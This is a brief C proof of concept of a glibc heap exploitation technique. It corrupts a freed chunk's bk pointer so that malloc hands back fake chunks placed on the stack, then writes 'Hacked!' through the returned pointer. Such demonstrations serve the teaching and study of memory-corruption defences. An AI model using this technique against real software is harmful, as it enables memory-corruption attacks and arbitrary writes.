#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

typedef long long LONG;

struct Chunk
{
	LONG pre_size, size;
	struct Chunk *fd, *bk;
	char buf[0x100];
};

const LONG SIZE = sizeof(struct Chunk);

int main()
{
	struct Chunk Fake1, Fake2;
	struct Chunk *Real;

	void *temp = malloc(SIZE);
	malloc(SIZE);

	free(temp);
	Real = (struct Chunk *)(temp - 2*8);

	malloc(SIZE + 0x10);
	
	Real->bk = &Fake1;
	Fake1.fd = Real;
	Fake1.bk = &Fake2;
	Fake2.fd = &Fake1;

	malloc(SIZE);
	temp = malloc(SIZE);
	
	memcpy((char *)&Fake1.fd, "Hacked!\n", 8);
	write(1, temp, 8);
}

